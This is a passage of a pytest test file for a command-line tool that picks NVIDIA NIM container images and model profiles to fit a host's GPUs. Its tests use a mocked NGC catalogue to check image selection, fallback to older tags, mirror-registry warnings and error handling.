        "gpu_name": "NVIDIA H100 NVL",
        "confirm_with": "list-model-profiles",
    }
    assert facts["environment_summary"]["groups"][0]["pci_device_id"] == H100_PCI
    assert isinstance(facts, dict)
    return facts


def test_fit_with_metadata_file(tmp_path: Path) -> None:
    out = tmp_path / "fit.json"
    env_file = write_env(tmp_path, h100_env())
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LLAMA_ID,
            "--env",
            str(env_file),
            "--metadata-file",
            metadata_file(),
            "--top",
            "3",
            "--out",
            str(out),
            env=ngc_env(server),
        )
        requested = list(server.requests)
    assert code == 0, payload
    facts = assert_fits_with_handoff(payload)
    assert facts["metadata"] == "file"
    assert facts["tag"] == "2.1.4"
    assert len(facts["shortlist"]) <= 3
    assert any("--metadata-file" in note and "--tag" in note for note in facts["notes"])
    assert not any(path.startswith(METADATA_PATH) for path in requested)
    assert json.loads(out.read_text(encoding="utf-8")) == facts


def test_fit_via_metadata_api(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    routes = {
        **repo_routes(),
        METADATA_PATH: (200, fixture_json("ngc", "metadata-llama-3.1-8b-instruct-2.1.4.json")),
    }
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            "nvcr.io/nim/meta/llama-3.1-8b-instruct:2.1.4",
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
        requested = list(server.requests)
    assert code == 0, payload
    facts = assert_fits_with_handoff(payload)
    assert facts["metadata"] == "published"
    assert not any("--metadata-file" in note for note in facts["notes"])
    query, *lenders = [path for path in requested if path.startswith(METADATA_PATH)]
    assert "tag=2.1.4" in query
    assert "llama-3.1-8b-instruct" in query
    # then, for their test records alone, the other images a select without a tag checks
    assert lenders == [meta_key(LLAMA_ID, "2.0.13"), meta_key(LLAMA_ID, "1.15.5")]


def test_fit_after_inspect_end_to_end(tmp_path: Path) -> None:
    env_file = tmp_path / "inspected.json"
    code, payload = run_cli(
        "nimselect.py",
        "inspect",
        "--cache-dir",
        str(tmp_path),
        "--out",
        str(env_file),
        env=host_tools(tmp_path),
    )
    assert code == 0, payload
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LLAMA_ID,
            "--env",
            str(env_file),
            "--metadata-file",
            metadata_file(),
            env=ngc_env(server),
        )
    assert code == 0, payload
    assert_fits_with_handoff(payload)


def test_fit_offline_with_metadata_file_when_ngc_is_down(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    with serve({}) as server:
        dead = ngc_env(server)
    code, payload = run_cli(
        "nimselect.py",
        "fit",
        LLAMA_ID,
        "--tag",
        "2.1.4",
        "--env",
        str(env_file),
        "--metadata-file",
        metadata_file(),
        env=dead,
    )
    assert code == 0, payload
    # Offline, NGC cannot say which CPU architectures the image has, and the metadata records
    # none: the profile that would fit stays unconfirmed (arch_not_recorded).
    assert (payload["state"], payload["next"]) == ("unknown", "ask_user")
    facts = payload["facts"]
    best = facts["best_unconfirmed"]
    assert (best["tier"], best["reasons"]) == ("tested", ["arch_not_recorded"])
    assert facts["handoff"]["verdict"] == "unknown"
    assert facts["handoff"]["model_profile"] == best["profile_id"]
    assert any("NGC could not be reached" in note for note in facts["notes"])


def test_offline_a_mirror_tag_named_with_the_tag_flag_is_the_tag_checked() -> None:
    """Offline, fit checks the tag named with --tag: the mirror warning says the same tag."""
    offline = nimselect.resolve_offline(
        "harbor.example.com/nim/meta/llama-3.1-8b-instruct", "2.1.4"
    )
    assert offline is not None
    [mirror] = offline["warnings"]
    assert "the nvcr.io image with the same name and tag" in mirror


def test_fit_without_published_metadata_offers_other_tags(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    routes = {**repo_routes(), METADATA_PATH: (404, fixture_json("ngc", "metadata-not-found.json"))}
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LLAMA_ID,
            "--tag",
            "1.15.5",
            "--env",
            str(env_file),
            env=ngc_env(server),
        )
    assert code == 3
    assert (payload["ok"], payload["state"], payload["next"]) == (False, "no_metadata", "ask_user")
    error = payload["errors"][0]
    assert error["code"] == "no_metadata"
    assert "list-model-profiles" in error["fix"]
    assert (
        "offer nim-deploy" in error["fix"] and "nim-select pulls and runs nothing" in error["fix"]
    )
    tags = payload["facts"]["tags_to_try"]
    assert tags[0] == "2.1.4"
    assert "1.15.5" not in tags
    assert len(tags) == 5


def test_fit_metadata_service_error_is_external(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    failure = {"requestStatus": {"statusCode": "INTERNAL_ERROR", "requestId": "req-500"}}
    with serve({**repo_routes(), METADATA_PATH: (500, failure)}) as server:
        code, payload = run_cli(
            "nimselect.py", "fit", LLAMA_ID, "--env", str(env_file), env=ngc_env(server)
        )
    assert code == 4
    assert payload["next"] == "fix_errors"
    assert payload["errors"][0]["code"] in {"metadata_service_error", "ngc_unreachable"}


def test_fit_rejects_an_invalid_env_file(tmp_path: Path) -> None:
    bad = tmp_path / "env.json"
    bad.write_text("{not json", encoding="utf-8")
    code, payload = run_cli(
        "nimselect.py", "fit", LLAMA_ID, "--env", str(bad), "--metadata-file", metadata_file()
    )
    assert code == 2
    assert payload["errors"][0]["code"] == "env_file_invalid"
    wrong = write_env(tmp_path, {"schema": "something-else"})
    code, payload = run_cli("nimselect.py", "fit", LLAMA_ID, "--env", str(wrong))
    assert code == 2
    assert payload["errors"][0]["code"] == "env_file_invalid"


def test_fit_rejects_an_invalid_metadata_file(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    meta = tmp_path / "meta.json"
    meta.write_text('{"nothing": 1}', encoding="utf-8")
    code, payload = run_cli(
        "nimselect.py", "fit", LLAMA_ID, "--env", str(env_file), "--metadata-file", str(meta)
    )
    assert code == 2
    assert payload["errors"][0]["code"] == "metadata_file_invalid"


@pytest.mark.parametrize("command", ["fit", "select", "list"])
def test_a_utf16_input_file_is_bad_input_never_a_traceback(tmp_path: Path, command: str) -> None:
    """Windows PowerShell's > writes UTF-16: --env and --metadata-file in UTF-16 are bad input
    (exit 2) that names the file and says how to save it, before any request."""
    good = write_env(tmp_path, h100_env())
    utf16 = tmp_path / "env-utf16.json"
    utf16.write_text(good.read_text(encoding="utf-8"), encoding="utf-16")
    args = {
        "fit": ["fit", LLAMA_ID, "--env", str(utf16), "--metadata-file", metadata_file()],
        "select": ["select", LLAMA_ID, "--env", str(utf16)],
        "list": ["list", "--env", str(utf16), "--source", "ngc"],
    }[command]
    code, payload = run_cli("nimselect.py", *args)
    assert (code, payload["errors"][0]["code"]) == (2, "env_file_invalid")
    assert str(utf16) in payload["errors"][0]["message"]
    assert "not UTF-8" in payload["errors"][0]["message"]
    if command != "fit":
        return
    meta = tmp_path / "meta-utf16.json"
    meta.write_text(Path(metadata_file()).read_text(encoding="utf-8"), encoding="utf-16")
    code, payload = run_cli(
        "nimselect.py", "fit", LLAMA_ID, "--env", str(good), "--metadata-file", str(meta)
    )
    assert (code, payload["errors"][0]["code"]) == (2, "metadata_file_invalid")
    assert "not UTF-8" in payload["errors"][0]["message"]
    assert "PowerShell" in payload["errors"][0]["fix"]


@pytest.mark.parametrize("target", ["host", "k8s"])
@pytest.mark.parametrize("source", ["published", "file"])
def test_fit_with_unknown_gpus_asks_the_user(tmp_path: Path, target: str, source: str) -> None:
    """As select does: an environment where no whole GPU can be counted stops fit before any
    NGC request, with the advice for that target (not ngc_unreachable or no_metadata)."""
    env = h100_env(gpus_known=False, conditions=[{"code": "mig_enabled", "message": "MIG is on"}])
    if target == "k8s":
        env.update(target="k8s", context="ctx", namespace="nim")
    env_file = write_env(tmp_path, env)
    extra = ["--metadata-file", metadata_file()] if source == "file" else []
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py", "fit", LLAMA_ID, "--env", str(env_file), *extra, env=ngc_env(server)
        )
        requested = list(server.requests)
    assert code == 3
    assert payload["next"] == "ask_user"
    assert payload["errors"][0]["code"] == "gpus_unknown"
    assert requested == []
    fix = payload["errors"][0]["fix"]
    assert ("a context with whole GPUs" in fix) is (target == "k8s")


def test_fit_that_does_not_fit_is_still_ok(tmp_path: Path) -> None:
    tiny = h100_env()
    tiny["groups"][0].update(memory_mib=4096, memory_gb=4.29)
    env_file = write_env(tmp_path, tiny)
    with serve(repo_routes()) as server:
        code, payload = run_cli(
            "nimselect.py",
            "fit",
            LLAMA_ID,
            "--env",
            str(env_file),
            "--metadata-file",
            metadata_file(),
            env=ngc_env(server),
        )
    assert code == 0, payload
    assert payload["ok"] is True
    assert payload["next"] == "ask_user"
    assert payload["facts"]["recommended"] is None
    assert "handoff" not in payload["facts"]
    assert payload["state"] in {"does_not_fit", "unknown"}


def test_fit_rejects_non_positive_limits(tmp_path: Path) -> None:
    env_file = write_env(tmp_path, h100_env())
    for flag in ("--max-gpus", "--top"):
        code, payload = run_cli("nimselect.py", "fit", LLAMA_ID, "--env", str(env_file), flag, "0")
        assert code == 2, flag
        assert payload["errors"][0]["code"] == "bad_input"


def test_scripts_run_under_system_python(tmp_path: Path) -> None:
    """The scripts need Python 3.10 or newer (SKILL.md): --help must work under /usr/bin/python3
    too, when it is that new."""
    python = Path("/usr/bin/python3")
    if not python.exists():
        pytest.skip("no /usr/bin/python3")
    probe = subprocess.run(
        [str(python), "-I", "-c", "import sys; print('%d.%d' % sys.version_info[:2])"],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=60,
        check=False,
    )
    version = ns.parse_version(probe.stdout)
    if version is None or version < (3, 10):
        found = probe.stdout.strip() or "of an unknown version"
        pytest.skip(f"/usr/bin/python3 is Python {found}; the scripts need 3.10 or newer")
    proc = subprocess.run(
        [str(python), str(SCRIPTS / "nimselect.py"), "fit", "--help"],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"},
        timeout=60,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr


# --- select ---------------------------------------------------------------------------------

SPARK_ID = f"{LLAMA_ID}-dgx-spark"
OTHER_PCI = "2901:10de"  # B200: a GPU the H100 NVL host does not have


def meta_key(resource_id: str, tag: str) -> str:
    return f"{METADATA_PATH}?resourceId={resource_id}&tag={tag}"


def profile(pid: str, pci: str = H100_PCI, tp: int = 1) -> dict[str, Any]:
    return {
        "profile_id": pid,
        "gpu_device": pci,
        "precision": "fp8",
        "tensor_parallel_size": tp,
        "pipeline_parallel_size": 1,
        "min_vram_per_device_gb": 20.0,
    }


def meta(*profiles: dict[str, Any]) -> tuple[int, dict[str, Any]]:
    return 200, {"profiles": list(profiles)}


FITS = meta(profile("fits-here"))
OTHER_GPU = meta(profile("other-gpu", pci=OTHER_PCI))
TOO_BIG = meta(profile("needs-16", tp=16))


BOTH = ["amd64", "arm64"]


def images_body(archs: dict[str, list[str]]) -> tuple[int, dict[str, Any]]:
    """GET /repos/{id}/images: the CPU architectures of each tag."""
    images = [
        {"tag": tag, "architectureVariants": [{"os": "linux", "architecture": a} for a in arch]}
        for tag, arch in archs.items()
    ]
    return 200, {"images": images}


def search_body(*resource_ids: str) -> dict[str, Any]:
    resources = [{"resourceId": rid, "name": rid.rsplit("/", 1)[-1]} for rid in resource_ids]
    return {"results": [{"groupValue": "CONTAINER", "resources": resources}]}


def select_routes(metadata: dict[str, Any], *hits: str) -> dict[str, Any]:
    """The llama repo (newest 2.1.4; older lines 2.0.13, 1.15.5), a dgx-spark variant, a search
    that finds `hits` (default: the repo, its variant, production branches and the base model)
    and the metadata answers keyed by `resource_id:tag`."""
    found = hits or (
        LLAMA_ID,
        SPARK_ID,
        f"{LLAMA_ID}-pb6",
        f"{LLAMA_ID}-pb25h2",
        "nim/meta/llama-3.1-8b-base",
    )
    spark = {"name": "llama-3.1-8b-instruct-dgx-spark", "tags": ["1.0.0-variant", "latest"]}
    routes: dict[str, Any] = {
        **repo_routes(),
        SEARCH_PATH: (200, search_body(*found)),
        f"/v2/repos/{SPARK_ID}": (200, {**spark, "latestTag": "1.0.0-variant"}),
        f"/v2/repos/{LLAMA_ID}/images": images_body(
            {"2.1.4": BOTH, "2.0.13": BOTH, "1.15.5": BOTH, "1.8.0-RTX": ["amd64"]}
        ),
        f"/v2/repos/{SPARK_ID}/images": images_body({"1.0.0-variant": BOTH}),
    }
    for image, answer in metadata.items():
        resource_id, tag = image.rsplit(":", 1)
        routes[meta_key(resource_id, tag)] = answer
    return routes


def run_select(
    tmp_path: Path, routes: dict[str, Any], *args: str, env: dict[str, Any] | None = None
) -> tuple[int, dict[str, Any], list[str]]:
    env_file = write_env(tmp_path, env or h100_env())
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py",
            "select",
            args[0] if args else LLAMA_ID,
            "--env",
            str(env_file),
            *args[1:],
            env=ngc_env(server),
        )
        requested = list(server.requests)
    return code, payload, requested


def considered(payload: dict[str, Any]) -> list[tuple[str, str, str, str | None]]:
    return [
        (i["tag"], i["kind"], i["metadata"], i["verdict"])
        for i in payload["facts"]["images_considered"]
    ]


def test_select_newest_fits(tmp_path: Path) -> None:
    out = tmp_path / "select.json"
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": FITS,
            f"{SPARK_ID}:1.0.0-variant": OTHER_GPU,
            f"{LLAMA_ID}:2.0.13": FITS,
        }
    )
    code, payload, requested = run_select(tmp_path, routes, LLAMA_ID, "--out", str(out))
    assert code == 0, payload
    assert (payload["ok"], payload["state"], payload["next"]) == (True, "fits", "confirm_with_user")
    facts = payload["facts"]
    assert facts["image_choice"] == {
        "image": f"nvcr.io/{LLAMA_ID}:2.1.4",
        "kind": "newest",
        "reason": "newest version that fits",
    }
    assert (facts["tag"], facts["metadata"], facts["mapping"]) == ("2.1.4", "published", "exact")
    assert facts["handoff"] == {
        "model": "meta/llama-3.1-8b-instruct",
        "image": f"nvcr.io/{LLAMA_ID}:2.1.4",
        "model_profile": "fits-here",
        "verdict": "fits",
        "backend": None,
        "gpus": "device=0",
        "gpu_ids": [0],
        "gpu_count": 1,
        "gpu_name": "NVIDIA H100 NVL",
        "confirm_with": "list-model-profiles",
    }
    assert considered(payload) == [
        ("2.1.4", "newest", "published", "fits"),
        ("1.0.0-variant", "variant", "published", "does_not_fit"),
        ("2.0.13", "older", "published", "fits"),
        ("1.15.5", "older", "not_published", None),
    ]
    first = facts["images_considered"][0]
    assert (first["profile_id"], first["gpus"], first["resource_id"]) == ("fits-here", 1, LLAMA_ID)
    assert not any(note.startswith("Newer version tags") for note in facts["notes"])
    assert facts["images_considered"][1]["rejected_counts"] == {"gpu_mismatch": 1}
    # production branches and the -base model are never checked, and the notes name the branches
    assert not any("-pb" in path or "8b-base" in path for path in requested)
    [note] = [n for n in facts["notes"] if "Production-branch" in n]
    assert f"{LLAMA_ID}-pb6" in note and f"{LLAMA_ID}-pb25h2" in note
    assert json.loads(out.read_text(encoding="utf-8")) == facts


def test_select_takes_the_hardware_variant_when_the_newest_has_no_profile_here(
    tmp_path: Path,
) -> None:
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": OTHER_GPU,
            f"{SPARK_ID}:1.0.0-variant": FITS,
            f"{LLAMA_ID}:2.0.13": FITS,
        }
    )
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 0, payload
    facts = payload["facts"]
    assert facts["image_choice"]["kind"] == "variant"
    assert facts["image_choice"]["image"] == f"nvcr.io/{SPARK_ID}:1.0.0-variant"
    assert "no profile that runs here" in facts["image_choice"]["reason"]
    assert (facts["resource_id"], facts["model"]) == (
        SPARK_ID,
        "meta/llama-3.1-8b-instruct-dgx-spark",
    )
    assert facts["handoff"]["image"] == f"nvcr.io/{SPARK_ID}:1.0.0-variant"


def test_select_takes_a_gpu_suffixed_tag_of_the_repo(tmp_path: Path) -> None:
    rtx = h100_env()
    rtx["groups"][0].update(name="NVIDIA RTX 6000 Ada Generation", pci_device_id="26b1:10de")
    rtx["groups"][0]["pci_device_ids"] = ["26b1:10de"]
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": OTHER_GPU,
            f"{LLAMA_ID}:1.8.0-RTX": meta(profile("rtx", "26b1:10de")),
        },
        LLAMA_ID,
    )
    code, payload, _ = run_select(tmp_path, routes, env=rtx)
    assert code == 0, payload
    assert considered(payload)[:2] == [
        ("2.1.4", "newest", "published", "does_not_fit"),
        ("1.8.0-RTX", "variant", "published", "fits"),
    ]
    assert payload["facts"]["image_choice"]["image"] == f"nvcr.io/{LLAMA_ID}:1.8.0-RTX"
    # taken for the GPU, not because the newer builds are not confirmed to fit: no note names
    # the general builds newer than 1.8.0 that were not checked
    assert not any(n.startswith("Newer version tags") for n in payload["facts"]["notes"])


def test_select_falls_back_to_an_older_version(tmp_path: Path) -> None:
    routes = select_routes(
        {
            f"{LLAMA_ID}:2.1.4": TOO_BIG,
            f"{SPARK_ID}:1.0.0-variant": OTHER_GPU,
            f"{LLAMA_ID}:2.0.13": TOO_BIG,
            f"{LLAMA_ID}:1.15.5": FITS,
        }
    )
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 0, payload
    choice = payload["facts"]["image_choice"]
    assert (choice["kind"], choice["image"]) == ("older", f"nvcr.io/{LLAMA_ID}:1.15.5")
    assert choice["reason"].startswith(
        "older version: the newer images checked are not confirmed to fit (2.1.4: "
    )
    assert "not_enough_gpus" in choice["reason"]
    assert payload["facts"]["tag"] == "1.15.5"
    # the reason names the images checked; a note names the newer builds that were not
    [note] = [n for n in payload["facts"]["notes"] if n.startswith("Newer version tags")]
    assert note == (
        f"Newer version tags of {LLAMA_ID} that were not checked: 2.0.12, 2.0.11, 2.0.10, 2.0.9, "
        "2.0.8, 2.0.7, 2.0.6, 2.0.5, 2.0.4, 2.0.3 and 2 more. Whether they fit is not known; name "
        "one with --tag to check it."
    )


# nim/meta/llama-3.1-8b-instruct on 2026-11-11 (the list fixture's repository record): newest
# 2.1.6, then 2.1.5, 2.1.4, the 2.0 line, the 1.15 line ... and 1.8.0-RTX
LIVE_LLAMA_TAGS: list[str] = fixture_json("list", "repo-meta__llama-3.1-8b-instruct.json")["tags"]


@pytest.mark.parametrize(
    ("gpu", "newer", "expected"),
    [
        ("NVIDIA H100 NVL", [], ["2.1.5", "2.1.4", "2.0.13", "1.15.5"]),
        ("NVIDIA RTX 6000 Ada Generation", [], ["1.8.0-RTX", "2.1.5", "2.0.13", "1.15.5"]),
        ("NVIDIA H100 NVL", ["2.1.8", "2.1.7"], ["2.1.7", "2.1.6", "2.0.13", "1.15.5"]),
    ],
    ids=["h100", "rtx", "two-new-builds"],
)
def test_the_older_lines_keep_their_places(gpu: str, newer: list[str], expected: list[str]) -> None:
    """The earlier builds of the newest's line take only the places --max-images leaves after
    the older lines. Each new build of the line once took one more: on an RTX GPU, where
    1.8.0-RTX takes a place, 1.15.5 was left out, and with 2.1.7 and 2.1.8 published no older line
    would have been checked."""
    tags = [*newer, *LIVE_LLAMA_TAGS]
    repo = {"name": "llama-3.1-8b-instruct", "tags": tags}
    listed = nimselect.ImageList(LLAMA_ID, {})
    newest = choose.Candidate(LLAMA_ID, str(ngc_api.newest_version(tags)), "newest")
    spark = choose.Candidate(f"{LLAMA_ID}-dgx-spark", "1.0.0-variant", "variant")
    env = h100_env()
    env["groups"][0]["name"] = gpu
    limit = choose.DEFAULT_MAX_IMAGES
    later = nimselect.later_candidates(LLAMA_ID, repo, listed, newest.tag, [spark], env, limit)
    kept, dropped = choose.plan([newest, *later], limit)
    assert [c.tag for c in kept] == [newest.tag, spark.tag, *expected]
    assert dropped == []


# Live NGC tags and image digests on 2026-11-11: each `-variant` tag is the same image as the plain
# build with its numbers, with the same metadata.
TWIN_REPOS = {
    "nim/moonshotai/kimi-k2.5": {
        "1.7.0-variant": "sha256:aba5f879b458",
        "latest": "sha256:aba5f879b458",
        "1": "sha256:aba5f879b458",
        "1.7.0": "sha256:aba5f879b458",
        "1.7": "sha256:aba5f879b458",
    },
    "nim/minimax-ai/minimax-m25": {
        "1.7.0": "sha256:c031ab1ebc8c",
        "1.7.0-variant": "sha256:c031ab1ebc8c",
        "1": "sha256:43942fa10760",
        "1.7.1-variant": "sha256:43942fa10760",
        "1.7.1": "sha256:43942fa10760",
        "latest": "sha256:43942fa10760",
    },
}


@pytest.mark.parametrize(
    ("rid", "checked"),
    [
        ("nim/moonshotai/kimi-k2.5", [("1.7.0", "newest")]),
        ("nim/minimax-ai/minimax-m25", [("1.7.1", "newest"), ("1.7.0", "older")]),
    ],
    ids=["kimi-k2.5", "minimax-m25"],
)
def test_select_checks_a_twin_tag_of_one_image_once(
    tmp_path: Path, rid: str, checked: list[tuple[str, str]]
) -> None:
    """A `-variant` tag with the digest of a build checked is that image: select reads its
    metadata once, and it takes no place in --max-images."""
    digests = TWIN_REPOS[rid]
    images = [
        {"tag": tag, "digest": digest, "architectureVariants": [{"os": "linux", "architecture": a}]}
        for tag, digest in digests.items()
        for a in ("amd64",)
    ]
    routes: dict[str, Any] = {
        f"/v2/repos/{rid}": (200, {"name": rid.rsplit("/", 1)[-1], "tags": list(digests)}),
        f"/v2/repos/{rid}/images": (200, {"images": images}),
        SEARCH_PATH: (200, search_body(rid)),
    }
    for tag in digests:
        routes[meta_key(rid, tag)] = OTHER_GPU
    code, payload, requested = run_select(tmp_path, routes, rid)
    assert code == 0, payload
    assert [(i["tag"], i["kind"]) for i in payload["facts"]["images_considered"]] == checked
    assert sum(path.startswith(METADATA_PATH) for path in requested) == len(checked)


def test_select_respects_the_tag_the_user_named(tmp_path: Path) -> None:
    routes = select_routes({f"{LLAMA_ID}:2.1.4": FITS, f"{LLAMA_ID}:2.0.13": OTHER_GPU})
    for args in ([LLAMA_ID, "--tag", "2.0.13"], [f"nvcr.io/{LLAMA_ID}:2.0.13"]):
        code, payload, requested = run_select(tmp_path, routes, *args)
        assert code == 0, payload
        assert (payload["state"], payload["next"]) == ("does_not_fit", "ask_user")
        assert considered(payload) == [("2.0.13", "requested", "published", "does_not_fit")]
        assert payload["facts"]["image_choice"]["kind"] == "requested"
        assert "handoff" not in payload["facts"]
        # the images of the repository a select without a tag checks are read for their test
        # records alone, and its hardware variant (another repository) not at all
        assert [path for path in requested if path.startswith(METADATA_PATH)] == [
            meta_key(LLAMA_ID, "2.0.13"),
            meta_key(LLAMA_ID, "2.1.4"),
            meta_key(LLAMA_ID, "1.15.5"),
        ]


def test_select_keeps_going_past_a_404_and_a_metadata_error(tmp_path: Path) -> None:
    failure = (500, {"requestStatus": {"statusCode": "INTERNAL_ERROR", "requestId": "req-500"}})
    routes = select_routes({f"{SPARK_ID}:1.0.0-variant": failure, f"{LLAMA_ID}:2.0.13": FITS})
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 0, payload
    assert considered(payload)[:3] == [
        ("2.1.4", "newest", "not_published", None),
        ("1.0.0-variant", "variant", "error", None),
        ("2.0.13", "older", "published", "fits"),
    ]
    assert "req-500" in payload["facts"]["images_considered"][1]["error"]
    reason = payload["facts"]["image_choice"]["reason"]
    assert "2.1.4: no published profiles" in reason
    assert "metadata could not be read" in reason


def test_select_mirror_ref_maps_by_name_with_a_warning(tmp_path: Path) -> None:
    routes = select_routes({f"{LLAMA_ID}:2.1.4": OTHER_GPU, f"{LLAMA_ID}:2.0.13": FITS})
    ref = "registry.example.com/nim/meta/llama-3.1-8b-instruct"
    code, payload, _ = run_select(tmp_path, routes, ref)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["mapping"], facts["resource_id"], facts["tag"]) == ("by_name", LLAMA_ID, "2.0.13")
    assert any("handed off, as the nvcr.io image" in w for w in facts["warnings"])
    # select chose another image than the newest: the user checks that the mirror carries it
    [carries] = [w for w in facts["warnings"] if "registry.example.com carries" in w]
    assert "is not the one named" in carries and f"{LLAMA_ID}:2.0.13" in carries
    assert facts["handoff"]["image"] == f"nvcr.io/{LLAMA_ID}:2.0.13"


@pytest.mark.parametrize("suffix", ["", ":latest"])
def test_a_mirror_ref_without_a_version_warns_that_the_tag_was_chosen_on_ngc(
    tmp_path: Path, suffix: str
) -> None:
    """No tag (or `latest`) on a mirror: the tag comes from NGC, so the user checks the mirror
    carries it, even when select takes the newest image."""
    ref = f"registry.example.com/nim/meta/llama-3.1-8b-instruct{suffix}"
    code, payload, _ = run_select(tmp_path, select_routes({f"{LLAMA_ID}:2.1.4": FITS}), ref)
    assert code == 0, payload
    facts = payload["facts"]
    assert facts["image_choice"]["kind"] == "newest"
    [carries] = [w for w in facts["warnings"] if "registry.example.com carries" in w]
    assert "The tag 2.1.4 was chosen on NGC" in carries and f"{LLAMA_ID}:2.1.4" in carries
    assert facts["handoff"]["image"] == f"nvcr.io/{LLAMA_ID}:2.1.4"
    meta_file = tmp_path / "metadata.json"
    meta_file.write_text(json.dumps({"profiles": [profile("fits-here")]}), encoding="utf-8")
    with serve(select_routes({})) as server:
        code, payload = run_cli(
            "nimselect.py", "fit", ref, "--env", str(write_env(tmp_path, h100_env())),
            "--metadata-file", str(meta_file), env=ngc_env(server),
        )  # fmt: skip
    assert code == 0, payload
    assert any("chosen on NGC" in w and "carries" in w for w in payload["facts"]["warnings"])
    # a tag the user named, in the reference or with --tag, is checked as it is: no extra warning
    bare = ref.split(":")[0]
    for named in ([f"{bare}:2.1.4"], [bare, "--tag", "2.1.4"]):
        code, payload, _ = run_select(tmp_path, select_routes({f"{LLAMA_ID}:2.1.4": FITS}), *named)
        assert code == 0, payload
        warnings = payload["facts"]["warnings"]
        assert any("with the same name and tag" in w for w in warnings), warnings
        assert not any("carries" in w or "chosen on NGC" in w for w in warnings), warnings


def test_a_mirror_alias_is_checked_as_the_build_it_stands_for(tmp_path: Path) -> None:
    """harbor.example.com/...:1.7 is checked as 1.7.0-variant: the warnings say the tag was chosen
    on NGC, never that it is the same tag."""
    routes = {
        f"/v2/repos/{QWEN35_ID}": (200, {"name": "qwen3.5-35b-a3b", "tags": QWEN35_TAGS}),
        f"/v2/repos/{QWEN35_ID}/images": same_image(QWEN35_TAGS),
        meta_key(QWEN35_ID, "1.7.0-variant"): FITS,
    }
    code, payload, _ = run_select(tmp_path, routes, f"harbor.example.com/{QWEN35_ID}:1.7")
    assert code == 0, payload
    warnings = payload["facts"]["warnings"]
    assert not any("same name and tag" in w for w in warnings), warnings
    assert any("same name (the tag is chosen on NGC)" in w for w in warnings), warnings
    [carries] = [w for w in warnings if "harbor.example.com carries" in w]
    assert "The tag 1.7.0-variant was chosen on NGC" in carries
    assert payload["facts"]["image_choice"]["reason"] == "the build `1.7` stands for; it fits"


def test_a_mirror_path_with_another_team_is_searched_by_name() -> None:
    """registry.example.com/ai-models/REPO: `ai-models` is no NGC team, so NGC is searched."""
    routes = {SEARCH_PATH: (200, fixture_json("ngc", "search-llama.json")), **repo_routes()}
    with serve(routes) as server:
        code, payload = run_cli(
            "nimselect.py",
            "resolve",
            "registry.example.com/ai-models/llama-3.1-8b-instruct:2.1.4",
            env=ngc_env(server),
        )
        requested = list(server.requests)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["resource_id"], facts["tag"], facts["mapping"]) == (LLAMA_ID, "2.1.4", "search")
    assert "/v2/repos/nim/ai-models/llama-3.1-8b-instruct" in requested
    assert any("nim/ai-models/llama-3.1-8b-instruct" in n and LLAMA_ID in n for n in facts["notes"])
    # the warnings name the NGC repository the search found, not "the same name"
    [mirror] = [w for w in facts["warnings"] if "handed off, as" in w]
    assert f"as nvcr.io/{LLAMA_ID} (found by a search for its name), with the same tag" in mirror
    [carries] = [w for w in facts["warnings"] if "registry.example.com carries" in w]
    assert "found by a search for the name" in carries and f"{LLAMA_ID}:2.1.4" in carries


def test_select_without_any_metadata_asks_the_user(tmp_path: Path) -> None:
    code, payload, _ = run_select(tmp_path, select_routes({}))
    assert code == 3
    assert (payload["ok"], payload["state"], payload["next"]) == (False, "no_metadata", "ask_user")
    assert payload["errors"][0]["code"] == "no_metadata"
    assert {m for _, _, m, _ in considered(payload)} == {"not_published"}
    tags = payload["facts"]["tags_to_try"]
    assert tags and not {"2.1.4", "2.0.13", "1.15.5"} & set(tags)


def test_select_with_only_metadata_errors_is_external(tmp_path: Path) -> None:
    failure = (500, {"requestStatus": {"statusCode": "INTERNAL_ERROR", "requestId": "req-500"}})
    routes = select_routes({}, LLAMA_ID)
    routes[METADATA_PATH] = failure
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 4
    assert payload["errors"][0]["code"] == "metadata_service_error"
    assert payload["facts"]["images_considered"]


def test_select_reports_the_real_code_of_other_ngc_errors(tmp_path: Path) -> None:
    forbidden = (403, {"requestStatus": {"statusCode": "FORBIDDEN", "requestId": "req-403"}})
    routes = select_routes({}, LLAMA_ID)
    routes[METADATA_PATH] = forbidden
    code, payload, _ = run_select(tmp_path, routes)
    assert code == 4
    assert payload["errors"][0]["code"] == "ngc_http_error"
    assert {i["error_code"] for i in payload["facts"]["images_considered"]} == {"ngc_http_error"}


def test_select_stops_when_ngc_asks_for_fewer_requests(tmp_path: Path) -> None:
    """A 429 that stays after the retries stops select (exit 4, ngc_rate_limited): it checks no
    further image, as more requests would only be refused."""
    too_many = (429, {"requestStatus": {"statusCode": "TOO_MANY_REQUESTS", "requestId": "r-429"}})
    routes = select_routes({}, LLAMA_ID)
    routes[METADATA_PATH] = too_many
    code, payload, requested = run_select(tmp_path, routes)
    assert (code, payload["errors"][0]["code"]) == (4, "ngc_rate_limited")
    assert "HTTP 429" in payload["errors"][0]["message"]
    assert len([path for path in requested if path.startswith(METADATA_PATH)]) == 3


def test_select_with_404s_and_an_error_is_no_metadata(tmp_path: Path) -> None:
    failure = (500, {"requestStatus": {"statusCode": "INTERNAL_ERROR", "requestId": "req-500"}})
